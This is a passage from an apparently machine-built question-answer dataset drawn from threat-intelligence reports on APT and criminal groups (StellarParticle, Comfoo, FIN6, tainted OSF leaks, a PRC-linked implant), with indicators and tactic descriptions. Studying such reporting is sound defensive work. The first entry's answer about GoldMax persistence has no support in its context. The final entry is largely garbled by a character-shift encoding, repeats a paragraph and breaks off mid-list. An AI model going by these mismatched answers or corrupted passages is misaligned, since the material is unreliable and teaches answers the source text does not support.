Access\nAcross multiple StellarParticle investigations, CrowdStrike identified unique reconnaissance activities performed by the threat actor: access of victims' internal knowledge repositories.6 Wikis are commonly used across industries to facilitate knowledge sharing and as a source of reference for a variety of topics. While operating in the victim's internal network, the threat actor accessed sensitive information specific to the products and services that the victim organization provided. This information included items such as product/service architecture and design documents, vulnerabilities and step-by-step instructions to perform various tasks. Additionally, the threat actor viewed pages related to internal business operations such as development schedules and points of contact. In some instances these points of contact were subsequently targeted for further data collection.\nThe threat actor's wiki access could be considered an extension of \"Credential Hopping\" described earlier. The threat actor established RDP sessions to internal servers using privileged accounts and then accessed the wiki using a different set of credentials. CrowdStrike observed the threat actor accessing the wiki as users who would be considered \"non-privileged\" from an Active Directory perspective but had access to sensitive data specific to the victim's products or services.\nAt this time, the malicious access of internal wikis is an information gathering technique that CrowdStrike has only observed in StellarParticle investigations. CrowdStrike was able to identify the wiki access primarily through forensic analysis of the internal systems used by the threat actor. Given the threat actor's penchant for clearing browser data, organizations should not rely upon the availability of these artifacts for future investigations. CrowdStrike recommends the following best practices for internal information repositories:\nEnable detailed access logging\nEnsure logs are centralized and stored for at least 180 days\nCreate detections for anomalous activity such as access from an unusual location like a server subnet\nEnable MFA on the repository site, or provide access via Single Sign On (SSO) behind MFA\n\nDescribe the persistence mechanism used by the Linux variant of GoldMax and how it differs from the Windows variant.",
    "output": "The Linux variant of GoldMax uses a crontab entry with a @reboot line for persistence, ensuring the malware executes upon system reboot. It also uses the nohup command to ignore hangup signals, allowing the process to continue running even if the terminal session is terminated. Unlike the Windows variant, which relies on different persistence mechanisms, the Linux variant focuses on crontab and nohup for maintaining its presence on the system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Comfoo characteristics\nTo maintain persistence on the system, Comfoo usually replaces the path to the DLL of an existing unused service rather than installing a new service. A new service is more likely to be noticed by system audits. Sometimes Comfoo is delivered with a rootkit that hides Comfoo's files on disk. Additionally, Comfoo starts the existing \"ipnat\" system service. This action causes remote inbound connections to the infected system to fail, blocking remote maintenance by the network administrator.\nBig Headline: Comfoo trojan C2 software discovery\nBy studying the network traffic of infected systems, CTU researchers determined that the server side of the Comfoo malware sends an HTTP server header identifying the server version as \"Apache 2.0.50 (Unix)\". However, the rest of the HTTP headers do not match the order or the formatting used by this version of Apache. This anomaly suggests that the C2 software was a standalone application instead of a series of scripts running under Apache. Searching for the specific server version string in the CTU malware repository produced a sample of the Comfoo server software, identified by the MD5 hash 2b29f0224b632fdd00d0a30527b795b7.\nMedium Headline: Analysis\nThe Comfoo C2 server turns out to be a rendezvous-type traffic relay program. This small binary can be deployed on rented or hacked Windows systems, where it passes traffic between Comfoo victims and the Comfoo master console operated by the threat actors (see Figure 2).\nUnlike \"dumb\" traffic relay servers such as (<http://www.secureworks.com/cyber-threat-intelligence/threats/htran/>)HTran, the Comfoo relay server does not know the location of the master console. Instead, the master console program connects to the relay server on-demand, and any incoming victim data is passed to the master console connection. HTran is sometimes used to add an additional layer of untraceabili-ty to the victim connection. Likewise, the administrator can add other layers of proxies or VPN connections to the console connection side of the communication.\nThe Comfoo relay server listens on up to three TCP ports at a time. The first port acts as a control and typically listens on port 1688. It performs the following tasks:\nEnables/disables the other ports\nAccepts new relay port configuration (stored in rlycfg.dll)\nNotifies master console that a new victim connection is available\nThe second port is the admin relay port, which typically listens on port 1689. It accepts connections from the master console to send commands to and receive data from victims' systems. The third port is the victim relay port, which listens on a configurable port number, usually port 80 or port 443. This port accepts connections from victims'\nsystems to send data to and receive commands from the Comfoo administrator encapsulated in HTTP requests and responses. If there is no current connection between the victim and the Comfoo administrator, Comfoo logs the victim's connection and sends an idle response to the victim.\nMedium Headline: DNS resolution tactics\nIn addition to using rendezvous protocols and HTran forwarding servers, Comfoo operators create and maintain another layer of obfuscation to thwart analysis of their infrastructure. Like many other APT malware families, Comfoo reaches out to its masters based on DNS lookups of certain hostnames. The Comfoo operators commonly use dynamic DNS providers to micromanage the IP addresses to which Comfoo hostnames resolve. While Comfoo sleeps, its operators often set those IP addresses to common or bogus entries. When not being used to actively control Comfoo, the C2 domain name might resolve to the address of a popular search engine or a local (<https://tools.ietf.org/html/rfc5735>)loopback (127.0.0.1), (<http://tools.ietf.org/html/rfc1918>)private (10.1.1.1), or other special use (0.0.0.0) IP address. Domain names used in Com-foo operations only point to actual control infrastructure during very short time windows. Only during these time windows do alerts from a DNS monitoring tool inform researchers when it might be possible to locate an actual Comfoo server. Figure 3 maps IP addresses used in Comfoo campaigns.\nThe map in Figure 4 shows only the IP addresses that actually speak Comfoo's protocol,\nillustrating how DNS tactics such as the distractor IP addresses can mask actual control infrastructure.\nMedium Headline: Taking control\nThe unauthenticated nature of the Comfoo relay server's administrative connections makes it possible to take control of the C2 server and all victims' systems, armed only with knowledge of the protocol, the encryption method, and the static encryption key hard-coded into every Comfoo binary. Researchers can passively monitor victims' logins to the relay servers (sending no commands) by connecting to the correct port on the correct IP address at the right time. This technique is analogous to viewing webserver log data stored in a publicly accessible directory on a C2 server.\nTo help identify and notify victims of Comfoo-based espionage, CTU researchers set up a passive monitoring system for dozens of active Comfoo C2 relays and have been running this system since January 2012. Connections from the monitoring system are periodic, so not all victim logins are observed. Only the initial connection data is logged, and it is not possible to see data being exfiltrated from victims' networks using this method.\nMedium Headline: Passive monitoring results\nWhile monitoring Comfoo, CTU researchers detected more than 200 variants of the tro-\njan and 64 different campaign tags used by the threat actors to organize their campaigns. Numerous government entities and private companies based in the United States, Europe, and Asia Pacific had Comfoo-infected computers phoning home to the Comfoo C2 infrastructure (see Figure 5).\nMuch of the traffic emanated from multiple Japanese and Indian government ministries. CTU researchers outlined the Japanese attack campaign in a previous analysis entitled (<http://www.secureworks.com/cyber-threat-intelligence/threats/chasing_apt/>)Chasing APT. The following industries were also targeted:\nEducation\nEnergy\nMineral exploration\nNews media\nSemiconductors\nSteel manufacturing\nThink tanks\nTelecommunications\nTrade organizations\nAudio and videoconferencing products\nThe targeting of audio and videoconferencing products is unusual. CTU researchers speculate that the threat actors might be looking for intellectual property relating to audio and videoconferencing. Another possibility is that it could be a clever and stealthy way of listening and watching activities of both commercial and government organizations.\nMedium Headline: Disk/memory/registry detection\nThe unique string T1Y943jIhk can be found in the Comfoo binary. Offline forensic analysis may be required to search for this string if a rootkit is in play.\nThese additional strings can be searched but are not guaranteed to be unique to Com-foo:\nCPUSpeed:%d.%dGHz\nCPUNameString:%s\nCPUVendorIdentifier:%s\nCPUIdentifier:%s\nNo %d CPU Information:\nSystemCurrent Time:\nsystemBoot Time:\nIE BHO Name:%s\n11. IE BHO Information!\n10. IE Version Information!\n9. InstallApp Information!\n8. NETBIOS Information!\n7. Protocol Information!\n6. NET Information!\n5. Disk Information!\n4. Account Information!\n3. System Time!\n2. CPU Type!\nCan not get this information, error code is %d.\nWindows Version Information!\nAdditionally, Comfoo uses the SetEvent Windows API and registers an event that frequently contains the word \"GAME\". The following are example Comfoo event names:\nexclusiveinstance12\nTHIS324NEWGAME\nMYGAMEHAVESTART\nMYGAMEHAVEstarted\nMYGAMEHAVESTARTEd\nMYGAMEHAVESTARTED\nthisisanewfirstrun\nTHISISASUPERNEWGAMENOWBEGIN\nthisisnewtrofor024\nTo persist without adding new registry entries, Comfoo edits an unused system service configuration, replacing the DLL path and setting it to auto-start on boot. For example, a system service registry key entry changed by Comfoo might resemble the following:\nsystem\\CurrentControlSet\\Services\\Netman\\Parameters\nOriginal: \"ServiceDll\" => \"%SystemRoot%\\System32\\netman.dll\"\nModified: \"ServiceDll\" => \"C:\\WINDOWS\\system32\\tabcteng.dll\"\nsystem\\CurrentControlSet\\Services\\Netman\nOriginal: \"Start\" => \"3\"\nModified: \"Start\" => \"2\"\nComfoo hijacks service settings for some legitimate service DLLs:\nnetman.dll\nrasauto.dll\nsens.dll\nThe following are DLL names commonly used by Comfoo:\ncmmos.dll\njacpet.dll\njavadb.dll\nmszlobm.dll\nnetfram.dll\nnetman.dll\nntdapie.dll\nntdelu.dll\nntobm.dll\nodbm.dll\nsenss.dll\nsuddec.dll\ntabcteng.dll\nvmmreg32.dll\nwininete.dll\nIf Comfoo successfully connects to the relay server and receives commands from the master console, then it creates a file named \"mstemp.temp\" on the infected system to store the output of the last shell command.\nQuestion: Why does Comfoo replace the path to the DLL of an existing unused service rather than installing a new service? What are the implications of this approach for system audits?",
    "output": "Answer: Comfoo replaces the path to the DLL of an existing unused service to avoid detection. A new service is more likely to be noticed by system audits, whereas modifying an existing service is less conspicuous. This approach helps Comfoo maintain persistence on the system without raising alarms during routine system checks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: The Open Society Foundations Case\nIn 2015, the Open Society Foundations (OSF) experienced a breach of confidential data.\nMaterials from this breach were in November 2015 and, much later, on the \"leak\" branded site DC Leaks, alongside a wide range of materials stolen from other (<http://washingtonmonthly.com/2017/01/09/the-medias-handling-of-leaked-material-from-russia-was-shameful/>)organizations. DC Leaks worked directly with some online outlets, and , as well as achieving substantial media impact.\nThe redundant releases enable a comparison of documents between the two leaks using public materials. The DC Leaks dump included the release of untainted stolen documents that (<https://foreignpolicy.com/2016/08/22/turns-out-you-cant-trust-russian-hackers-anymore/>)had been previously released as part of a tainted leak by Cyber Berkut. An used this dump to identify several cases of leak tainting. We were able to verify each of their observations, as well as identifying additional elements of tainting.\nWe then contacted OSF's IT staff, who provided us with the original genuine documents which we were able to use as the basis for further comparisons, and to authenticate the documents posted on DC Leaks. Taken together, the tainting appears designed to create the impression that several groups and media outlets, including Alexei Navalny's Foundation for Fighting Corruption, are supported by OSF.\nAs with the Satter case, the tainting appears to have a primarily domestic focus, and to be aimed at de-legitimizing figures like Navalny by making it appear that they are the recipients of illicit, foreign funding. This is a view that Navalny, one of the targets of the tainting, has also .\nA Budget Document\nFirst, CyberBerkut released a tainted to make it appear as if OSF was funding Alexei Navalny's Foundation for Fighting Corruption.\nThe tainters may have been working quickly, resulting in a small error, in which a dollar amount was substituted for \"Approved Date.\"\nProposed Strategy Document\nSecond, a t was similarly modified to include the Foundation for Fighting Corruption in a list of groups to receive OSF support.\nThe tainting resumed later in the document, when several media outlets (Echo Moscow, RosBusinessConsulting, and Vedomosti) were also added to the document, apparently to create the perception that they had received the support of OSF.\nThe second instance of tainting in the strategy document also introduced a slight grammatical error when the tainters neglected to remove \"an\" before changing \"news site\" to the plural \"news sites.\"\nDocument Addressing the NGO Law\nFinally, in a document addressing grantees and , tainting was again performed to . The tainting also purported to show the foundation receiving money via Yandex, a widely-used Russian platform offering an online payment service.\nTaken together, both the tainted document stolen from David Satter, and the tainted OSF documents paint a picture of a competent adversary working to achieve several objectives, including discrediting domestic critics of Russia's government and president, while simultaneously attempting to embarrass foreign funders with activities in Russia. In we discuss the significance of tainted leaks as a disinformation technique.\n\nWhat errors were made during the tainting process of the OSF documents, and how did these errors reveal the manipulation efforts?",
    "output": "During the tainting process of the OSF documents, several errors were made that revealed the manipulation efforts. One error involved substituting a dollar amount for 'Approved Date' in a budget document, indicating that the tainters might have been working quickly and carelessly. Another error occurred in a proposed strategy document where the tainters neglected to remove the word 'an' before changing 'news site' to the plural 'news sites,' introducing a slight grammatical error. These mistakes highlighted the artificial nature of the document modifications and provided clues that the documents had been tampered with.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: FIN6\nFIN6 is a cyber criminal group intent on stealing payment card data for monetization. In 2015, FireEye Threat Intelligence supported several Mandiant Consulting investigations in the hospitality and retail sectors where FIN6 actors had aggressively targeted and compromised point-of-sale (POS) systems, making off with millions of payment card numbers. Through iSIGHT, we learned that the payment card numbers stolen by FIN6 were sold on a \"card shop\" \u2014 an underground criminal marketplace used to sell or exchange payment card data. Figure 1 illustrates what we believe to be FIN6's typical operational methodology.\nFIREEYE INTELLIGENCE TRACKS\ntargeted Financial threats (known as \"FIN\" groups) capable of using a wide range of tools and tactics during their computer network intrusions. These groups employ a high level of planning, organization and task management to accomplish their goals. The threat actors generally target a particular demographic or type of organization, and their goal is financial gain from the data they steal. They may profit through direct sale of stolen data (such as payment cards or personally identifiable information), unauthorized transfer of funds (such as with stolen bank account or bank routing credentials); or insider trading (based on the theft of nonpublic business information).\nGRABNEW, ALSO KNOWN AS NEVERQUEST AND VAWTRAK, emerged around 2013 and since then has been consistently and indiscriminately spread through massive spam campaigns. We typically differentiate between threat actors who indiscriminately distribute malware and threat actors who use malware selectively. GRABNEW itself is a credential-stealing backdoor with form-grabbing capabilities and the ability to inject code into specific web pages to, for example, mimic a valid login prompt for a financial institution to facilitate banking fraud. In some cases, the presence of GRABNEW malware has overlapped with the spread of POS malware such as PoSeidon, a variant of the Backoff POS malware.\nBig Headline: GAININGACCESS INDISCRIMINATE OR INTENTIONAL?\nIt's not entirely clear how FIN6 initially compromises victims. In Mandiant's investigations, FIN6 already possessed valid credentials to each victim network and used those credentials to initiate further intrusion activity.1 In one case, GRABNEW malware was found on a victim computer that FIN6 later used in its operations. We suspect that the computer was originally compromised with GRABNEW by a separate threat actor, who used GRABNEW to capture valid user credentials. FIN6 may have obtained those credentials (through purchase or trade) and used them for its operations.\nFIN6's use of GRABNEW, or credentials collected by GRABNEW, is not altogether surprising and possibly points to a cyber crime support ecosystem that opens doors to threat actors capable of lateral movement and more damaging activities. Previously, we observed another FIN group \u2014 FIN2 \u2014 leverage several existing Citadel compromises to deploy their custom tools and expand within a network to compromise payment card systems. Likewise, Proofpoint recently observed GRABNEW variants leading to downloads of POS malware known as AbaddonPOS.\n1  When investigating an intrusion, it may be challenging to determine the initial method of compromise \u2014 the means through which a threat group first gained access to a victim network. While in some cases evidence may point to a spear-phishing attack or exploit execution, in other cases little to no forensic evidence of the original compromise remains.\nBig Headline: FIN6 GETTING THE JOB DONE\nAll threat groups generally follow a broad operational framework known as the Attack Lifecycle. While the phases of the Attack Lifecycle \u2014 from initial compromise to privilege escalation to maintaining presence and completing the mission \u2014 are remarkably consistent, the specific TTPs used vary widely based on a group's skills, motivations and ultimate goals.\nAfter gaining access with valid credentials, we observed FIN6 leveraging components of the Metasploit Framework to establish their foothoold. For example, in one case, FIN6 used a Metasploit PowerShell module to download and execute shellcode and to set up a local listener that would execute shellcode received over a specific port. Similarly, FIN6 used at least two downloaders called HARDTACK and SHIPBREAD (apparent variations on Metasploit payloads) to establish backdoor access to the compromised environment. Both of these tools are configured to connect to remote command\nand control (CnC) servers and download and execute shellcode. FIN6 generally used either registry run keys or Windows scheduled tasks in order to establish persistence for these tools.\nOnce their accesses were established with preferred backdoors, FIN6 used additional public utilities such as Windows Credentials Editor for privilege escalation and credential harvesting. Additional privilege escalation tools exploited Microsoft Windows vulnerabilities in an attempt to compromise privileged account credentials on various hosts. The tools targeted CVE-2013-3660, CVE-2011-2005  and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.2 Continuing their use of Metasploit-related tools, FIN6 also used Metasploit's PsExec NTDSGRAB module to obtain a copy of the Active Directory database (ntds.dit). Access to this file would allow them to extract password hashes from the file and crack them offline.\n2 These vulnerabilities have all been patched by Microsoft; Windows systems with up-to-date software and security patches should not be exploitable.\nIn addition to collecting credentials, FIN6 used publicly available tools to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers and NetBIOS. In particular, during the reconnaissance phase they gathered information on systems running SQL instances, dumping schemas for multiple databases and SQL user accounts. Specific tools used by FIN6 included Microsoft's built-in SQL querying tool (osql.exe), Query Express (a free, portable graphical SQL client capable of connecting to Microsoft SQL and Oracle databases) and AdFind, a free command-line tool for querying Active Directory. Over the course of one day, for example, the group targeted more than 900 SQL servers to dump reconnaissance information to support further operations.\nCapitalizing on the acquired reconnaissance data, FIN6 began lateral movement using credentials stolen from various systems on which they gathered usernames and password hashes. They likely cracked these hashes outside of the target's network before using multiple sets of domain admin credentials in combination with remote command execution tools such as PsExec and Remote Command Executor (RemCom) throughout the rest of the lateral movement phase.\nTo maintain presence and support interactive access in the environment, FIN6 leveraged the publicly available Plink command-line utility (part of the PuTTY SSH and Telnet suite) to create SSH tunnels to CnC servers under their control. As shown in Figure 2, they used these SSH tunnels to route Remote Desktop Protocol (RDP) traffic and allow for interactive RDP sessions with systems in the target network.\nAfter locating POS systems within the target's environment, FIN6 deployed POS malware that we call TRINITY (also known as FrameworkPOS), with Scheduled Tasks being used for persistence. TRINITY runs\ncontinuously and targets system processes not listed in its accompanying process blacklist, seeking data that matches payment card track data. Once the malware identifies track data, it copies and encodes it to a local file in a subdirectory of the c:\\windows\\ directory while attempting to conceal these files with .dll or .chm extensions. In one particular case \u2014 and as an example of scale \u2014 FIN6 compromised and deployed TRINITY on around 2,000 systems, resulting in millions of exposed cards.\nTRINITY IS POS MALWARE THAT ATTEMPTS TO LOCATE AND STEAL PAYMENT CARD DATA FROM MEMORY.\nThe malware first creates mutexes named m_number3 and MuTex-Check and exits if either already exists. The malware then continuously iterates over the current process listing and examines the memory space of each process. Processes with module names less than five characters are skipped, along with some specific process names that are unlikely to contain payment card information. TRINITY logs captured data to disk, typically to a file in %WINDIR%\\temp or %WINDIR%\\help. The malware encodes the data with a simple substitution cipher and single-byte XOR using the OxAA key.\nFinally, to move the stolen payment card data out of the environment, FIN6 used a script to systematically iterate through a list of compromised POS systems, copying the harvested track data files to a numbered \"log\" file before removing the original data files. They then compressed the log files into a ZIP archive and moved the archive through the environment to an intermediary system and then to a staging system. From the staging system, they then copied the stolen data to external CnC servers under their control using the FTP command line utility. In another case, FIN6 used an alternative extraction method to upload payment card data to a public file sharing service.\nFIGURE 2: NETWORK DIAGRAM SHOWING FIN6 PLINK SSH TUNNEL USED TO ROUTE RDP TRAFFIC TO VICTIM COMPUTERS\nOur analysis of the data sold through this underground vendor indicates that FIN6's compromises are highly profitable to the actors involved, potentially resulting in extensive fraud losses.\nAnswer this question: How does the broader cyber crime ecosystem support the operations of groups like FIN6, and what implications does this have for incident response and cybersecurity strategies?",
    "output": "The broader cyber crime ecosystem supports the operations of groups like FIN6 by providing a marketplace for stolen credentials and other resources. For example, FIN6 may have obtained valid credentials through purchase or trade from other threat actors who used malware like GRABNEW to capture them. This ecosystem allows threat actors to leverage existing compromises and tools to expand their operations. The implications for incident response and cybersecurity strategies include the need to consider the potential for overlapping compromises and the importance of monitoring underground markets for signs of stolen data. Additionally, understanding the broader ecosystem can help in developing more comprehensive defensive strategies and improving the overall security posture.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: CONCLUSION\nThe samples involved in this incident are typical of attacks commonly associated with the People's Republic of China (PRC).  These code samples have a variety of Tools, Techniques, and Procedures (TTPs) WKDW\ue003DUH\ue003XVHG\ue003WR\ue003WUDFN\ue003DQG\ue003LGHQWLI\\\ue003VSHFL\u00bfF\ue003DGYHUVDU\\\ue003JURXSV\ue011\ue003\ue0037KH\ue003VRSKLVWLFDWLRQ\ue003RI\ue003WKH\ue003DFWRU\ue003UHVSRQVLEOH\ue003IRU\ue003 WKLV\ue003LQFLGHQW\ue003LV\ue003GLI\u00bfFXOW\ue003WR\ue003TXDQWLI\\\ue003ZLWKRXW\ue003YLVLELOLW\\\ue003LQWR\ue003WKH\ue003DFWLYLWLHV\ue003WKDW\ue003WUDQVSLUHG\ue003RQ\ue003WKH\ue003YLFWLPV\ue003QHWZRUN\ue011\ue003\ue003 The ability to conduct Incident Response (IR) including forensics, and log analysis, greatly augments this visibility into these aspects of the incident.  Some indications as to the adversaries' capabilities can be derived from the captured samples alone.\nMedium Headline: Dropper/Implant #1\nThe dropper code (MD5: 14c04f88dc97aef3e9b516ef208a2bf5) does not utilize any techniques that are unique or unusual, and is consistent with tools, techniques, and procedures of attacks targeting proprietary information and generally attributed to the PRC. The presence of dead code and its replacement by a more VLPSOH\ue003REIXVFDWLRQ\ue003PHWKRG\ue003WR\ue003KLGH\ue003WKH\ue003WR\ue010EH\ue010GURSSHG\ue003GOO\ue003ELQDU\\\ue003\u00bfOH\ue003LQGLFDWHV\ue003FRGH\ue003UHXVH\ue003RQ\ue003WKH\ue003DWWDFNHU\ue003 side.  The 'dead code' utilizes a more sophisticated compression algorithm provided by a third party which was rendered useless for some reason.  This may have been a result of the attacker modifying an existing tool, or unknowingly using a re-purposed tool. The dropper resources indicate the compiler used to build the tool was running on a system that utilized the Chinese \"Simple\" language pack and was built on Wednesday May 4th, 2011 at 11:04:24 A.M. UTC (early evening time in China).  While this can be deliberately spoofed DV\ue003D\ue003\u00b5IDOVH\ue003\u00c0DJ\u00b6\ue003RWKHU\ue003LQGLFDWRUV\ue003LQFOXGLQJ\ue003WKH\ue003&\ue015\ue003DUH\ue003FRQVLVWHQW\ue003ZLWK\ue003WKLV\ue003KDYLQJ\ue003EHHQ\ue003WKH\ue003ZRUN\ue003RI\ue003D\ue003&KLQHVH\ue003 speaking actor.\nThe dropped DLL (MD5: 47619fca20895abc83807321cbb80a3d) itself contains functionality that is typical RI\ue003D\ue0035HPRWH\ue003$FFHVV\ue0037RRO\ue003\ue00b5$7\ue00c\ue003ZKLFK\ue003DUH\ue003FRPPRQO\\\ue003XVHG\ue003E\\\ue00335&\ue003EDVHG\ue003DFWRUV\ue003LQ\ue003GDWD\ue003H[\u00bfOWUDWLRQ\ue003DWWDFNV\ue011\ue003\ue003 7KH\ue003FRGH\ue003TXDOLW\\\ue003LV\ue003QRW\ue003LPSUHVVLYH\ue00f\ue003DQG\ue003FRQWDLQV\ue003D\ue003WULYLDO\ue003VWDFN\ue003EXIIHU\ue003RYHU\u00c0RZ\ue003YXOQHUDELOLW\\\ue011\ue003\ue003'HVSLWH\ue003WKH\ue003EXIIHU\ue003RYHU\u00c0RZ\ue00f\ue003WKH\ue003&\ue015\ue003FKDQQHO\ue003ODFNV\ue003DQ\\\ue003FRPPDQG\ue003DXWKHQWLFDWLRQ\ue003RU\ue003HQFU\\SWLRQ\ue00f\ue003DSDUW\ue003IURP\ue003WKH\ue003LQLWLDO\ue003EHDFRQ\ue003 encryption/obfuscation using a statically compiled XOR key.  The sample uses TCP port 443 for communication, but makes no attempt to mimic the SSL protocol typically used on that port number, which would provide enhanced Operational Security (OPSEC).  This code appears to have been compiled on Wednesday May 4th, 2011 at 10:48:19 A.M. UTC (early evening time in China).\nMedium Headline: Post Exploitation Tool\nThe post exploitation tool (MD5: 2dce7fc3f52a692d8a84a0c182519133) is a dual-use tool, it can be dropped and executed by a client-side exploit, or the adversary can launch it using a variety of command line options.  This tool is built in Microsoft .NET framework, which is typically an indication of a less sophisticated attacker, because .NET is easier to develop in but requires the .NET framework be present on the victim machine.  The tool appears to have been compiled on Thursday May 26th, 2011 at 10:21:44 A.M. UTC (early evening time in China).  The sample utilizes the AES cryptographic algorithm to protect its C2 communications.\nMedium Headline: Implant #2 Backdoor DLL\nThis DLL is a moderately sophisticated backdoor with several well designed communication mechanisms not typically seen in these types of implants.  The code base for the sample was developed in C++.  The code appears to have been compiled on Sunday October 30, 2011 at 12:43:33 P.M. UTC (late evening time in China).  This sample has multiple communication capabilities available that makes it far more versatile and stealthy.  It implements relatively well thought out protocols including HTTP and DNS.  The tool has the ability to automatically down select the most effective communication channel once it has been instantiated, which can help avoid detection from solutions like DNS blacklisting and RFC protocol enforcement.  The DLL itself contains traces of the original C++ class names that were utilized in the source code, which in JHQHUDO\ue003ZHUH\ue003SUH\u00bf[HG\ue003ZLWK\ue003\u00b53&&\u00b6\ue011\ue003\ue0037KH\ue003VDPSOH\ue003VXSSRUWV\ue003WKH\ue003DELOLW\\\ue003WR\ue003DFW\ue003DV\ue003D\ue003JHQHULF\ue003SUR[\\\ue00f\ue003WKLV\ue003PD\\\ue003EH\ue003 LQWHQGHG\ue003WR\ue003SUR[\\\ue003&\ue015\ue003WUDI\u00bfF\ue003IRU\ue003RWKHU\ue003LQIHFWHG\ue003PDFKLQHV\ue003LQ\ue003RUGHU\ue003WR\ue003PLQLPL]H\ue003WKH\ue003QXPEHU\ue003RI\ue003V\\VWHPV\ue003 communicating to the C2, thus enhancing OPSEC.  The sample contains 'dead code' which appears to be command and control server classes, this is likely an indicator that the C2 client which would communicate with this sample shares the same communications library which was compiled into this sample.\nSystem Driver\nThe kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the CCRootkit package publicly by Steven Lai (a/k/a embedlinux).  This kernel mode rootkit implements several hooking techniques that are aimed at preventing a system administrator from detecting the backdoor DLL.  The implementation of these techniques has some unique idiosyncrasies that permit direct attribution to the source code Steven Lai posted.  This driver attempts to hide a wide swath of TCP ports (40000-45000) for an unknown reason, however it is suspected that this may relate to the potential network relaying capability alluded to for the backdoor dll.\nMedium Headline: System Driver\nThe kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the CCRootkit package publicly by Steven Lai (a/k/a embedlinux).  This kernel mode rootkit implements several hooking techniques that are aimed at preventing a system administrator from detecting the backdoor DLL.  The implementation of these techniques has some unique idiosyncrasies that permit direct attribution to the source code Steven Lai posted.  This driver attempts to hide a wide swath of TCP ports (40000-45000) for an unknown reason, however it is suspected that this may relate to the potential network relaying capability alluded to for the backdoor dll.\nMedium Headline: Appendix C: Remote Commands Supported by .NET Backdoor Post Exploitation Tool Sample\npublic class RcDataCommand {     public byte channelHint;     public RcDataCommandId cmdID;     public RcDataCommandType cmdType;     public string extraInfo;     public string string_0;\n}\nImplemented values for cmdID are as follows:\n\"\ue003\ue003\ue015\ue01d\ue003&UHDWH6KHOO\ue003\ue010\ue003([HFXWH\ue003DSSOLFDWLRQ\ue003DQG\ue003VHQG\ue003RXWSXW\ue003WR\ue003&\ue015\ue011\n\"\ue003\ue003\ue016\ue01d\ue0035HDG)LOH\ue003\ue010\ue0038SORDG\ue003\u00bfOH\ue003WR\ue003&\ue015\n\"\ue003\ue003\ue01b\ue01d\ue003([HFXWH\ue003\ue010\ue003([HFXWH\ue003DSSOLFDWLRQ\ue003DQG\ue003VHQG\ue003RXWSXW\ue003WR\ue003&\ue015\ncmdType can be one of the following (Interesting commands explained in detail):\n\ue003 \"\ue003\ue003\ue013\ue01d\ue0031RQH\n\ue003 \"\ue003\ue003\ue014\ue01d\ue003&RPPDQG\n\ue003 \"\ue003\ue003\ue015\ue01d\ue003,QIR\n\"\ue003\ue003\ue016\ue01d\ue003(UURU\n\"\ue003\ue003\ue017\ue01d\ue003+HDUW%HDW\n\"\ue003\ue003\ue018\ue01d\ue003&KDQQHO&UHDWH\n\"\ue003\ue003\ue019\ue01d\ue003&KDQQHO%LQG\n\"\ue003\ue003\ue01a\ue01d\ue003&KDQQHO7HUPLQDWH\n\"\ue003\ue003\ue01b\ue01d\ue003&KDQQHO5HTXHVW&UHDWH\n\"\ue003\ue003\ue01c\ue01d\ue003&KDQQHO5HTXHVW&RQ\u00bfUPDWLRQ$FFHSW\n\"\ue003\ue003\ue014\ue013\ue01d\ue003&KDQQHO5HTXHVW&RQ\u00bfUPDWLRQ'HQLHG\n\"\ue003\ue003\ue014\ue014\ue01d\ue0032EMHFW\ue003\ue010\ue003H[WUD,QIR\ue003SDUDPHWHU\ue003LV\ue003DQ\ue003;0/\ue003VHULDOL]HG\ue003REMHFW\ue011\n|\ue003\ue003VWULQJB\ue013\ue003  \ue003\ue014\ue01d\ue003GRZQORDG\ue003D\ue003\u00bfOH\ue003RU\ue003\ue0111(7\ue003PRGXOH\ue011\n|\ue003\ue003VWULQJB\ue013\ue003  \ue003\ue015\ue01d\ue003FRQQHFW\ue003WR\ue003,3\ue003DGGUHVV\ue011\n\"\ue003\ue003\ue014\ue015\ue01d\ue003,QLWLOL]H6WULQJ7DEOH\n\"\ue003\ue003\ue014\ue016\ue01d\ue003&OHDU0HPRU\\)LOHV\ue003\ue010\ue003FOHDU\ue003OLVW\ue003RI\ue003GRZQORDGHG\ue003PRGXOHV\ue011\n\"\ue003\ue003\ue014\ue017\ue01d\ue003/RDG0RGXOH\ue003\ue010\ue003ORDG\ue003D\ue003SUHYLRXVO\\\ue003GRZQORDGHG\ue003PRGXOH 